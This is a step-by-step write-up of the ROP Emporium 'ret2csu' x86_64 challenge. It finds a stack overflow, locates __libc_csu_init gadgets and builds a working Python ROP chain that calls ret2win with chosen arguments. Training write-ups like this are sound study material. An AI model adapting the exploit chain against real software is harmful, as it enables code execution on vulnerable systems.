# ROP Emporium - 08 ret2csu x86_64

## ELF Binary Info
> $ `rabin2 -I ./ret2csu`  
```
arch     x86
baddr    0x400000
binsz    6441
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    .
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
- canary false
- nx true (i.e. DEP enabled)
- pic false (i.e. not PIE)

## Goal
- `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`
- Call the ret2win function with arguments:
  - rdi = 0xdeadbeefdeadbeef
  - rsi = 0xcafebabecafebabe
  - rdx = 0xd00df00dd00df00d

## Check Buffer Overflow
- Open ELF Binary in GDB (`-q` is for quiet mode):
> $ `gdb ./ret2csu -q`  
> (gdb) `r`  
```
[...]
> AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[...]
```
- Program seg-faulted, so analyse registers and stack to see what amount of data is required to overflow buffer:
> (gdb) `i r`  
```
[...]
rbp            0x4545454545454545  0x4545454545454545
rsp            0x7ffc24812018      0x7ffc24812018
[...]
```
> (gdb) `x/4gx $rsp`  
```
0x7ffc24812018:	0x4646464646464646	0x4747474747474747
0x7ffc24812028:	0x00007fe5d4da300a	0x0000000000000031
```
- 0x4545454545454545 == "EEEEEEEE"
- 0x4646464646464646 == "FFFFFFFF"
- Therefore buffer is 32 bytes in size, after that is the base pointer followed by the return address

## Look for ROP Gadgets
- We know from the challenge's goal (i.e. `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`), rdi, rsi and rdx registers need to be set
- Open ELF binary in radare2 for further analysis:
> $ `r2 -A ./ret2csu`  
- Look for ROP gadgets that can control rdx:
> [0x00400520]> `/R rdx`  
```
[...]
  0x00400680             4c89fa  mov rdx, r15
  0x00400683             4c89f6  mov rsi, r14
  0x00400686             4489ef  mov edi, r13d
  0x00400689           41ff14dc  call qword [r12 + rbx*8]
```
- With above gadget, rdx and rsi can be controlled if we first have control over r15 and 14 respectively
- NOTE 1: Gadget ends with a `call`, not a `ret`
- NOTE 2: The `call qword [r12 + rbx*8]` instruction makes a call to a **pointer** to a function (i.e. the function's memory address needs to be stored somewhere else in memory, which we then reference)
- NOTE 3: The `mov edi, r13d` instruction will not help set rdi, so rdi will have to be set afterwards separately

- Look for ROP gadgets that can control r12, r14, r15:
> [0x00400520]> `/R pop r12`  
```
  0x0040069c               415c  pop r12
  0x0040069e               415d  pop r13
  0x004006a0               415e  pop r14
  0x004006a2               415f  pop r15
  0x004006a4                 c3  ret
```

- Look for ROP gadgets that can control rdi:
> [0x00400520]> `/R pop rdi`  
```
  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret
```

> - As a sidenote, the `pop r12; pop r13; pop r14; pop r15; ret` gadget and the `mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]` gadget are both part of the `__libc_csu_init` function. We can see that by printing the function's disassembly:
> > [0x00400520]> `pdf @ sym.__libc_csu_init`  
> ```
> [...]
> │       ╭─< 0x00400674      7420           je 0x400696
> │       │   0x00400676      31db           xor ebx, ebx
> │       │   0x00400678      0f1f84000000.  nop dword [rax + rax]
> │       │   ; CODE XREF from sym.__libc_csu_init @ 0x400694
> │      ╭──> 0x00400680      4c89fa         mov rdx, r15                ; char **ubp_av
> │      ╎│   0x00400683      4c89f6         mov rsi, r14                ; int argc
> │      ╎│   0x00400686      4489ef         mov edi, r13d               ; func main
> │      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
> │      ╎│   0x0040068d      4883c301       add rbx, 1
> │      ╎│   0x00400691      4839dd         cmp rbp, rbx
> │      ╰──< 0x00400694      75ea           jne 0x400680
> │       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
> │       ╰─> 0x00400696      4883c408       add rsp, 8
> │           0x0040069a      5b             pop rbx
> │           0x0040069b      5d             pop rbp
> │           0x0040069c      415c           pop r12
> │           0x0040069e      415d           pop r13
> │           0x004006a0      415e           pop r14
> │           0x004006a2      415f           pop r15
> ╰           0x004006a4      c3             ret
> ```
> - As shown above, starting from address `0x0040069a` the gadget is actually able to `pop rbx; pop rbp` before performing the pops found earlier, so we could choose to utilise this depending on the situation

## Planning ROP Chain
- The `mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]` gadget ends by calling a pointer to a function
- Therefore, we need to search the ELF binary for relatively benign functions to call that we can hopefully continue from, so list all functions:
> [0x00400520]> `afl`  
```
[...]
0x004004d0    3 23           sym._init
0x004006b4    1 9            sym._fini
[...]
```
- These two functions above might be useful, so disassemble each one
- Disassemble function `_init`:
> [0x00400520]> `pdf @ sym._init`  
```
            ; CALL XREF from sym.__libc_csu_init @ 0x40066c
            ;-- section..init:
            ;-- .init:
╭ 23: sym._init ();
│           0x004004d0      4883ec08       sub rsp, 8	; [11] -r-x section size 23 named .init
│           0x004004d4      488b051d0b20.  mov rax, qword [reloc.__gmon_start__] ; [0x600ff8:8]=0
│           0x004004db      4885c0         test rax, rax
│       ╭─< 0x004004de      7402           je 0x4004e2
│       │   0x004004e0      ffd0           call rax
│       │   ; CODE XREF from sym._init @ 0x4004de
│       ╰─> 0x004004e2      4883c408       add rsp, 8
╰           0x004004e6      c3             ret
```
- Disassemble function `_fini`:
> [0x00400520]> `pdf @ sym._fini`  
```
            ;-- section..fini:
            ;-- .fini:
╭ 9: sym._fini ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
│           0x004006b4      4883ec08       sub rsp, 8	; [14] -r-x section size 9 named .fini
│           0x004006b8      4883c408       add rsp, 8
╰           0x004006bc      c3             ret
```
- Both `_init` and `_fini` functions look like they can be used, so I've chosen to use `_fini`
- Search for references to _fini function within the ELF binary via its hex value `0x00000000004006b4` (note: need to take into account endianness):
> [0x00400520]> `/x b406400000000000`  
```
Searching 8 bytes in [0x601038-0x601040]
hits: 0
Searching 8 bytes in [0x600df0-0x601038]
hits: 1
Searching 8 bytes in [0x400000-0x400828]
hits: 1
Searching 8 bytes in [0x100000-0x1f0000]
hits: 0
0x00600e48 hit0_0 b406400000000000
0x004003b0 hit0_1 b406400000000000
```
-Two matches were found, so pick one (i.e. either `0x00600e48` or `0x004003b0`) and that will be the pointer to `_fini` function

> - As a sidenote, the address `0x00600e48` is in the `_DYNAMIC` object, which can be easily viewed in hex view (cycle through view modes using `p` key if necessary until you reach hex view):
> > [0x00400520]> `V @ obj._DYNAMIC`  
> ```
> [0x00600e00 [Xadvc]0 42% 1440 ./ret2csu]> xc @ obj._DYNAMIC
> - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
> [...]
> 0x00600e30  0c00 0000 0000 0000 d004 4000 0000 0000  ..........@.....
> 0x00600e40  0d00 0000 0000 0000 b406 4000 0000 0000  ..........@.....
> ```
> - A better view of this is in GDB:
> > (gdb) `x/4gx (void*) &_DYNAMIC + 0x38`  
> ```
> 0x600e38:	0x00000000004004d0	0x000000000000000d
> 0x600e48:	0x00000000004006b4	0x0000000000000019
> ```
> - And the address `0x004003b0` is in the `.dynsym` section
> > [0x00400520]> `V @ sym..dynsym`  
> ```
> [0x004002d0 [Xadvc]0 0% 1440 ./ret2csu]> xc @ section..dynsym
> - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
> [...]
> 0x004003b0  b406 4000 0000 0000 0000 0000 0000 0000  ..@.............
> ```
- So the plan is to:
  1. Use `pop r12; pop r13; pop r14; pop r15; ret` to place our desired values into registers (most importantly r15, which will then be moved to rdx in Step 2. below)
  2. Use `mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]` to mov the values into the correct registers (except for rdi, which will need to be set afterwards in a later step)
  3. Keep control of the program after `call qword [r12 + rbx*8]` was executed in Step 2. above (continue to section below to see how this was achieved)

## Recovering From a Call Instead of a Ret
- In order to make a successful call to a function using `call qword [r12 + rbx*8]`, we first need to establish what value we're going to set r12 to
- We have determined from the previous sections that we want to call the `_fini` function, which is located at `0x4006b4`, but we need a pointer to this address due to `call qword [r12 + rbx*8]` requiring a pointer
- We have also found two pointers to `0x4006b4`, and we chose to use `0x600e48`, so this is value that we want `r12 + rbx*8` to evaluate to
- If we set rbx to zero, then r12 simply needs to be set to `0x600e48`, and we found the gadget for this which was at `0x40069a`. But what if we didn't manage to find this gadget? This is quite possible because on default settings, using command `/R pop rbx` in radare2's ROP gadget search tool won't return any results (possibly due to the gadget's length):
> $ `r2 -A ./ret2csu`  
> [0x00400520]> `/R pop rbx`  
> [0x00400520]>  
- So if we assume we didn't find the `pop rbx` part of the gadget, then we need to know the value of rbx before this instruction is executed
- There are many ways we can determine the value of rbx. This time, I have chosen to create a [FIFO](https://www.man7.org/linux/man-pages/man7/fifo.7.html), then open two terminals (first for dynamic analysis of the ELF binary which accepts input from the FIFO, second to write to the FIFO).

### 1st terminal 
- Make a FIFO using `mkfifo <name_of_fifo>`:
> $ `mkfifo my_fifo`  
- Open ELF binary in GDB:
> $ `gdb ./ret2csu -q`  
- The `pwnme` function is imported from `libret2csu.so`, so if you immediately try to disassemble `pwnme` function the addresses won't have been evaluated yet:
> (gdb) `disass pwnme`  
```
Dump of assembler code for function pwnme@plt:
   0x0000000000400500 <+0>:	jmp    QWORD PTR [rip+0x200b12]        # 0x601018 <pwnme@got.plt>
   0x0000000000400506 <+6>:	push   0x0
   0x000000000040050b <+11>:	jmp    0x4004f0
End of assembler dump.
```
- Therefore, use `start` to set a temporary breakpoint on main() and start executing a program under GDB:
> (gdb) `start`  
```
Temporary breakpoint 1 at 0x40060b
[...]
Temporary breakpoint 1, 0x000000000040060b in main ()
```
- Now try disassembling `pwnme` function again:
> (gdb) `disass pwnme`  
```
Dump of assembler code for function pwnme:
[...]
   0x00007feee45299bf <+133>:	call   0x7feee45297f0 <read@plt>
   0x00007feee45299c4 <+138>:	lea    rdi,[rip+0x34a]        # 0x7feee4529d15
   0x00007feee45299cb <+145>:	call   0x7feee45297a0 <puts@plt>
   0x00007feee45299d0 <+150>:	nop
   0x00007feee45299d1 <+151>:	leave  
   0x00007feee45299d2 <+152>:	ret    
End of assembler dump.
```
- Set a breakpoint before the `ret` instruction using a **relative** memory address, because we're going to run the program again but using the previously created FIFO for input instead of regular STDIN:
> (gdb) b *pwnme+152
- Print useful info at each breakpoint using `define hook-stop`:
> (gdb) `define hook-stop`  
```
Type commands for definition of "hook-stop".
End with a line saying just "end".
>i r
>x/12i $rip
>x/8gx $rsp
>end
```
- Now run the program again using the previously created FIFO (`my_fifo`) for input, and input `y` to start again from beginning:
> (gdb) `r < my_fifo`  
```
The program being debugged has been started already.
Start it from the beginning? (y or n) y
```
- As you can see, GDB is now waiting for input from the FIFO, so that's where the 2nd terminal comes in handy

### 2nd terminal
- We're going write a Python script that can write raw bytes to STDOUT which can interact with the FIFO we created previously. Once we've determined the correct values to use, this same script can then be easily repurposed into a get_flag script.
> $ `vim get_flag.py`  
```python
import struct
import sys

def p64(value: int) -> bytes:
    return struct.pack('<Q', value)

def main():
    elf = './ret2csu'
    # Goal: ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

    # ROP gadgets
    ret2win_plt = 0x400510
    pop_rdi = 0x4006a3
    pop_r12_r13_r14_r15 = 0x40069c
    mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8 = 0x400680

    # Constants
    padding = b'A'*8*4
    rbx_val = 0x00      # if we're lucky, rbx will be zero and we won't need to adjust for it
    fini_ptr = 0x600e48 # target value
    r12_val = fini_ptr  # if we're lucky, rbx will be zero and we won't need to adjust for it
    r12_bytes = p64(r12_val)
    rdi_bytes = p64(0xdeadbeefdeadbeef)
    rsi_bytes = p64(0xcafebabecafebabe)
    rdx_bytes = p64(0xd00df00dd00df00d)

    # ROP chain
    rop_chain = b''
    rop_chain += p64(pop_r12_r13_r14_r15) + r12_bytes + rdi_bytes + rsi_bytes + rdx_bytes # pop r12; pop r13; pop r14; pop r15; ret
    rop_chain += p64(mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
    rop_chain += p64(pop_rdi) + rdi_bytes # Need to set rdi again
    rop_chain += p64(ret2win_plt) # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

    # Get flag
    payload = padding + p64(0x00) + rop_chain
    sys.stdout.buffer.write(payload)
    
if __name__ == '__main__':
    main()
```
- Save script and exit using `:wq`, then run Python script and write to our FIFO:
> $ `python get_flag.py > my_fifo`

### Back to 1st terminal
- Having written to the FIFO using our Python script, GDB will now have continued execution of the program and reached our breakpoint just before the `ret` instruction:
```
> Thank you!
rax            0xb                 11
rbx            0x400640            4195904
[...]
=> 0x7f009651f9d2 <pwnme+152>:	ret    
   0x7f009651f9d3 <ret2win>:	push   rbp
[...]
0x7fff08776b38:	0x000000000040069c	0x0000000000600e48
0x7fff08776b48:	0xdeadbeefdeadbeef	0xcafebabecafebabe
0x7fff08776b58:	0xd00df00dd00df00d	0x0000000000400680
0x7fff08776b68:	0x00000000004006a3	0xdeadbeefdeadbeef

Breakpoint 2, 0x00007f009651f9d2 in pwnme () from ./libret2csu.so
```
- Unfortunately, rbx is set to 0x400640, as shown above
- Step through each instruction one by one until we're before the `call qword [r12 + rbx*8]` instruction to see if rbx changes:
> (gdb) `si`  
- We can see that as we step through instructions we're moving along our ROP chain until we reach `call qword [r12 + rbx*8]`, but unfortunately rbx is still `0x400640`:
```
rax            0xb                 11
rbx            0x400640            4195904
[...]
=> 0x400689 <__libc_csu_init+73>:	call   QWORD PTR [r12+rbx*8]
   0x40068d <__libc_csu_init+77>:	add    rbx,0x1
   0x400691 <__libc_csu_init+81>:	cmp    rbp,rbx
   0x400694 <__libc_csu_init+84>:	jne    0x400680 <__libc_csu_init+64>
   0x400696 <__libc_csu_init+86>:	add    rsp,0x8
   0x40069a <__libc_csu_init+90>:	pop    rbx
   0x40069b <__libc_csu_init+91>:	pop    rbp
   0x40069c <__libc_csu_init+92>:	pop    r12
   0x40069e <__libc_csu_init+94>:	pop    r13
   0x4006a0 <__libc_csu_init+96>:	pop    r14
   0x4006a2 <__libc_csu_init+98>:	pop    r15
   0x4006a4 <__libc_csu_init+100>:	ret    
0x7fff08776b68:	0x00000000004006a3	0xdeadbeefdeadbeef
0x7fff08776b78:	0x0000000000400510	0x0000000000400520
0x7fff08776b88:	0x00007fff08776c30	0x0000000000000000
0x7fff08776b98:	0x0000000000000000	0x36401d3034d901d6
0x0000000000400689 in __libc_csu_init ()
```
- If we carry on stepping, we'll segfault due to the `call qword [r12 + rbx*8]` not accessing valid memory, so we'll have to adjust for the value of rbx when we set r12
- Our target is for `fini_ptr = 0x600e48`
- Current value of rbp is `rbp_val = 0x400640`
- Working backwards from when `r12 + rbx*8` is evaluated, we will set a very high value for r12 such when rbx*8 is added it overflows and the resulting memory address evaluates to 0x600e48:
  - r12_val = 0x10000000000000000 + fini_ptr - (rbp_val*8)
  - r12_val = 0x10000000000600e48 - (0x400640*8)
  - r12_val = 0xfffffffffe5fdc48
- Restart program with FIFO as input `r < my_fifo`, then go back to 2nd terminal to update Python script

### Back to 2nd terminal
- Update Python script:
```python
[...]
    rbx_val = 0x400640  # taken from program's state prior to `call qword [r12 + rbx*8]` instruction
    fini_ptr = 0x600e48 # target value
    r12_val = 0x10000000000000000 + fini_ptr - (rbx_val*8) # 0x10000000000600e48-(0x400640*8)==0xfffffffffe5fdc48
[...]
```
- Save script and exit, then run Python script and write to our FIFO:
> $ `python get_flag.py > my_fifo`

### Back to 1st terminal again
- Having written to the FIFO using our updated Python script, GDB will now have continued execution of the program and reached our breakpoint just before the `ret` instruction
- Keep stepping through using `si` until immediately **before** the `call QWORD PTR [r12+rbx*8]` instruction:
```
=> 0x400689 <__libc_csu_init+73>:	call   QWORD PTR [r12+rbx*8]
   0x40068d <__libc_csu_init+77>:	add    rbx,0x1
[...]
rbx            0x400640            4195904
rcx            0x7fe4b96111e7      140620339417575
rdx            0xd00df00dd00df00d  -3454841397007486963
rsi            0xcafebabecafebabe  -3819410105351357762
rdi            0xdeadbeef          3735928559
[...]
r12            0xfffffffffe5fdc48  -27272120
r13            0xdeadbeefdeadbeef  -2401053088876216593
r14            0xcafebabecafebabe  -3819410105351357762
r15            0xd00df00dd00df00d  -3454841397007486963
rip            0x4006b4            0x4006b4 <_fini>
[...]
```
- Notice how rdx, rsi, rbx, r12 are set up as expected, hopefully the next step will step into the `_fini` function:
> (gdb) `si`  
```
=> 0x4006b4 <_fini>:	sub    rsp,0x8
   0x4006b8 <_fini+4>:	add    rsp,0x8
   0x4006bc <_fini+8>:	ret
[...]
0x00000000004006b4 in _fini ()
```
- It worked! After `_fini` function finishes executing, it should return back to `__libc_csu_init` immediately **after** the `call QWORD PTR [r12+rbx*8]` instruction, so keep stepping:
> (gdb) `si`  
```
[...]
=> 0x40068d <__libc_csu_init+77>:	add    rbx,0x1
   0x400691 <__libc_csu_init+81>:	cmp    rbp,rbx
   0x400694 <__libc_csu_init+84>:	jne    0x400680 <__libc_csu_init+64>
   0x400696 <__libc_csu_init+86>:	add    rsp,0x8
   0x40069a <__libc_csu_init+90>:	pop    rbx
   0x40069b <__libc_csu_init+91>:	pop    rbp
   0x40069c <__libc_csu_init+92>:	pop    r12
   0x40069e <__libc_csu_init+94>:	pop    r13
   0x4006a0 <__libc_csu_init+96>:	pop    r14
   0x4006a2 <__libc_csu_init+98>:	pop    r15
   0x4006a4 <__libc_csu_init+100>:	ret    
   0x4006a5:	nop
0x7fff4c14ad08:	0x00000000004006a3	0xdeadbeefdeadbeef
0x7fff4c14ad18:	0x0000000000400510	0x0000000000400520
0x7fff4c14ad28:	0x00007fff4c14add0	0x0000000000000000
0x7fff4c14ad38:	0x0000000000000000	0x936a092fcd7ab098
0x000000000040068d in __libc_csu_init ()
```
- As we can see above, we're back in `__libc_csu_init` as expected, but there are some additional instructions that we're going to have to adjust for before the function returns
- The first hurdle we're going to have to overcome is that we don't want the jump to occur here:
```
=> 0x40068d <__libc_csu_init+77>:	add    rbx,0x1
   0x400691 <__libc_csu_init+81>:	cmp    rbp,rbx
   0x400694 <__libc_csu_init+84>:	jne    0x400680 <__libc_csu_init+64>
```
- As shown above, rbx has 1 added to itself, rbp is compared to new rbx, then jump happens only if they're **not** equal. So in order for us to **not** jump, we want to set rbp to the new rbx value (original_rbx + 1)

- Then before we return, there are a number of stack related instructions (equivalent to 7 stack entries in total):
```
   0x400696 <__libc_csu_init+86>:	add    rsp,0x8
   0x40069a <__libc_csu_init+90>:	pop    rbx
   0x40069b <__libc_csu_init+91>:	pop    rbp
   0x40069c <__libc_csu_init+92>:	pop    r12
   0x40069e <__libc_csu_init+94>:	pop    r13
   0x4006a0 <__libc_csu_init+96>:	pop    r14
   0x4006a2 <__libc_csu_init+98>:	pop    r15
   0x4006a4 <__libc_csu_init+100>:	ret
```
- We don't care about any of these values at this point, so we can just add nonsense values to the ROP chain for them. Note that the `add rsp,0x8` instruction doesn't affect any registers, but it effectively skips over one of our stack entries.
- Go back to 2nd terminal to update Python script for hopefully a successful dry run

### Back to 2nd terminal again
- Update Python script:
```python
import struct
import sys

def p64(value: int) -> bytes:
    return struct.pack('<Q', value)

def main():
    elf = './ret2csu'
    # Goal: ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

    # ROP gadgets
    ret2win_plt = 0x400510
    pop_rdi = 0x4006a3
    pop_r12_r13_r14_r15 = 0x40069c
    mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8 = 0x400680

    # Constants
    padding = b'A'*8*4
    rbx_val = 0x400640  # rbp value when executing `call qword [r12 + rbx*8]`
    rbp_val = rbx_val+1 # to prevent jump after `0x400691 <__libc_csu_init+81>:	cmp rbp,rbx`
    fini_ptr = 0x600e48 # target value
    # NOTE: r12_val=0xfffffffffe5fdc48 so that when `r12 + rbx*8` is evaluated, set high value for r12 such when rbx*8 is added it overflows and the memory address evaluates to 0x600e48
    r12_val = 0x10000000000000000 + fini_ptr - (rbx_val*8) # 0x10000000000600e48-(0x400640*8)==0xfffffffffe5fdc48
    r12_bytes = p64(r12_val)
    rdi_bytes = p64(0xdeadbeefdeadbeef)
    rsi_bytes = p64(0xcafebabecafebabe)
    rdx_bytes = p64(0xd00df00dd00df00d)

    # ROP chain
    rop_chain = b''
    rop_chain += p64(pop_r12_r13_r14_r15) + r12_bytes + rdi_bytes + rsi_bytes + rdx_bytes # pop r12; pop r13; pop r14; pop r15; ret
    rop_chain += p64(mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
    rop_chain += p64(0x00) * 7 # To maintain stack integrity after calling _fini function (pointed to by r12)
    rop_chain += p64(pop_rdi) + rdi_bytes # Need to set rdi again
    rop_chain += p64(ret2win_plt) # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

    # Get flag
    payload = padding + p64(rbp_val) + rop_chain
    sys.stdout.buffer.write(payload)
    
if __name__ == '__main__':
    main()
```
- Save script and exit, then run Python script and this time pipe output directly to the ELF binary:
> $ `python get_flag.py | ./ret2csu`
```
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
- Success! The script can be left as it is as we've already read the flag, but the sample version included [here](./get_flag.py) went a step further (only changed 2 lines of code) by using the subprocess Python module to interact with the ELF binary directly and read the flag itself without having to pipe any output in the shell.


